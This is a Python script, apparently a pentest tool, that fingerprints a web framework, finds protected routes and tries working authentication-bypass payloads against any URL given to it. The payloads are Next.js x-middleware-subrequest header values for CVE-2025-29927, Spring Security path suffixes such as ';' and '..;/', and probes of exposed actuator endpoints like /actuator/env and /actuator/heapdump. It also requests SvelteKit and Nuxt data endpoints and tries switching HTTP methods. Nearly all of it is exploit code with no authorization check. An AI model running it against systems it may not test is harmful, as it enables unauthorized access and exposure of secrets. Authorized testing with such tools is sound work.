#!/usr/bin/env python3
"""
Framework Middleware Auth Bypass Tester
Tests Next.js, Nuxt.js, SvelteKit, Remix, Spring, Django, Express
for middleware/route guard bypass vulnerabilities.
"""

import requests
import sys
import json
import concurrent.futures
from urllib.parse import urlparse

class FrameworkBypassTester:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = True
        self.findings = []

    def detect_framework(self):
        """Detect target web framework."""
        resp = self.session.get(self.target, allow_redirects=True)
        headers = resp.headers
        body = resp.text.lower()

        framework = 'unknown'
        indicators = []

        # Next.js
        if 'x-powered-by' in headers and 'next.js' in headers['x-powered-by'].lower():
            framework = 'nextjs'
            indicators.append(f"X-Powered-By: {headers['x-powered-by']}")
        elif '/_next/' in body or '__next' in body:
            framework = 'nextjs'
            indicators.append("Next.js markers in page source")

        # Nuxt.js
        elif '__nuxt' in body or '_payload.json' in body:
            framework = 'nuxtjs'
            indicators.append("Nuxt.js markers in page source")

        # SvelteKit
        elif '__data.json' in body or 'sveltekit' in body:
            framework = 'sveltekit'
            indicators.append("SvelteKit markers in page source")

        # Spring
        elif any(h in headers for h in ['X-Application-Context']):
            framework = 'spring'
            indicators.append("Spring framework headers")
        elif 'jsessionid' in str(resp.cookies).lower():
            framework = 'spring'
            indicators.append("JSESSIONID cookie (Java/Spring)")

        # Django
        elif 'csrfmiddlewaretoken' in body:
            framework = 'django'
            indicators.append("Django CSRF token found")

        # Express
        elif 'x-powered-by' in headers and 'express' in headers['x-powered-by'].lower():
            framework = 'express'
            indicators.append(f"X-Powered-By: {headers['x-powered-by']}")

        print(f"[*] Framework detected: {framework}")
        for i in indicators:
            print(f"    {i}")
        return framework

    def find_protected_routes(self):
        """Discover routes that require authentication."""
        test_paths = [
            '/admin', '/dashboard', '/settings', '/profile',
            '/api/admin', '/api/users', '/api/config',
            '/internal', '/management', '/panel',
            '/api/v1/admin', '/admin/users', '/admin/settings',
        ]
        protected = []
        for path in test_paths:
            try:
                resp = self.session.get(f"{self.target}{path}", allow_redirects=False, timeout=10)
                if resp.status_code in [301, 302, 307, 308, 401, 403]:
                    protected.append({'path': path, 'status': resp.status_code})
            except:
                pass
        print(f"[+] Found {len(protected)} protected routes")
        return protected

    def test_nextjs_bypass(self, protected_routes):
        """Test Next.js middleware bypass (CVE-2025-29927)."""
        print("\n[*] Testing Next.js middleware bypass...")
        bypass_headers = [
            'middleware',
            'src/middleware',
            'middleware:middleware:middleware:middleware:middleware',
            'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware',
            'pages/_middleware',
            'middleware.ts',
            'middleware.js',
        ]

        for route in protected_routes:
            baseline = self.session.get(f"{self.target}{route['path']}", allow_redirects=False)
            for header_val in bypass_headers:
                resp = self.session.get(
                    f"{self.target}{route['path']}",
                    headers={'x-middleware-subrequest': header_val},
                    allow_redirects=False
                )
                if resp.status_code == 200 and baseline.status_code != 200:
                    finding = {
                        'severity': 'CRITICAL',
                        'type': 'Next.js Middleware Bypass (CVE-2025-29927)',
                        'path': route['path'],
                        'header': f'x-middleware-subrequest: {header_val}',
                        'baseline_status': baseline.status_code,
                        'bypass_status': resp.status_code,
                    }
                    self.findings.append(finding)
                    print(f"  [CRITICAL] BYPASS: {route['path']} via {header_val}")

    def test_nuxt_bypass(self, protected_routes):
        """Test Nuxt.js payload and API bypass."""
        print("\n[*] Testing Nuxt.js bypass...")
        for route in protected_routes:
            # Payload JSON leak
            resp = self.session.get(f"{self.target}{route['path']}/_payload.json")
            if resp.status_code == 200:
                self.findings.append({
                    'severity': 'HIGH',
                    'type': 'Nuxt.js Payload Data Leak',
                    'path': f"{route['path']}/_payload.json",
                })
                print(f"  [HIGH] Payload leak: {route['path']}/_payload.json")

    def test_sveltekit_bypass(self, protected_routes):
        """Test SvelteKit __data.json bypass."""
        print("\n[*] Testing SvelteKit bypass...")
        for route in protected_routes:
            resp = self.session.get(f"{self.target}{route['path']}/__data.json")
            if resp.status_code == 200:
                self.findings.append({
                    'severity': 'HIGH',
                    'type': 'SvelteKit Data Endpoint Leak',
                    'path': f"{route['path']}/__data.json",
                })
                print(f"  [HIGH] Data leak: {route['path']}/__data.json")

    def test_spring_bypass(self, protected_routes):
        """Test Spring Security path traversal bypass."""
        print("\n[*] Testing Spring Security bypass...")
        bypass_suffixes = [';', ';.css', '%3b', '%00', '%0a', '..;/', '/.',  '//']

        for route in protected_routes:
            baseline = self.session.get(f"{self.target}{route['path']}", allow_redirects=False)
            for suffix in bypass_suffixes:
                test_path = f"{route['path']}{suffix}"
                resp = self.session.get(f"{self.target}{test_path}", allow_redirects=False)
                if resp.status_code == 200 and baseline.status_code != 200:
                    self.findings.append({
                        'severity': 'CRITICAL',
                        'type': 'Spring Security Path Bypass',
                        'path': test_path,
                    })
                    print(f"  [CRITICAL] Spring bypass: {test_path}")

        # Actuator endpoints
        actuator_paths = ['/actuator', '/actuator/env', '/actuator/heapdump',
                         '/actuator/configprops', '/actuator/mappings']
        for path in actuator_paths:
            resp = self.session.get(f"{self.target}{path}", allow_redirects=False)
            if resp.status_code == 200:
                self.findings.append({
                    'severity': 'CRITICAL',
                    'type': 'Spring Actuator Exposed',
                    'path': path,
                })
                print(f"  [CRITICAL] Actuator: {path}")

    def test_method_bypass(self, protected_routes):
        """Test HTTP method-based auth bypass."""
        print("\n[*] Testing HTTP method bypass...")
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE']

        for route in protected_routes[:3]:  # Limit to first 3 routes
            baseline_status = route['status']
            for method in methods:
                try:
                    resp = requests.request(method, f"{self.target}{route['path']}",
                                           allow_redirects=False, timeout=10)
                    if resp.status_code == 200 and baseline_status != 200:
                        self.findings.append({
                            'severity': 'HIGH',
                            'type': 'HTTP Method Auth Bypass',
                            'path': route['path'],
                            'method': method,
                        })
                        print(f"  [HIGH] Method bypass: {method} {route['path']}")
                except:
                    pass

    def run(self):
        """Execute full bypass testing."""
        print(f"{'='*60}")
        print(f"Framework Middleware Auth Bypass Tester")
        print(f"Target: {self.target}")
        print(f"{'='*60}")

        framework = self.detect_framework()
        protected = self.find_protected_routes()

        if not protected:
            print("[-] No protected routes found")
            return

        # Run framework-specific tests
        if framework == 'nextjs':
            self.test_nextjs_bypass(protected)
        elif framework == 'nuxtjs':
            self.test_nuxt_bypass(protected)
        elif framework == 'sveltekit':
            self.test_sveltekit_bypass(protected)
        elif framework == 'spring':
            self.test_spring_bypass(protected)

        # Always run generic tests
        self.test_method_bypass(protected)

        # Report
        print(f"\n{'='*60}")
        print(f"RESULTS: {len(self.findings)} findings")
        print(f"{'='*60}")
        for f in self.findings:
            print(f"  [{f['severity']}] {f['type']}: {f.get('path', 'N/A')}")

        return self.findings


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"Example: {sys.argv[0]} https://target.com")
        sys.exit(1)

    tester = FrameworkBypassTester(sys.argv[1])
    tester.run()
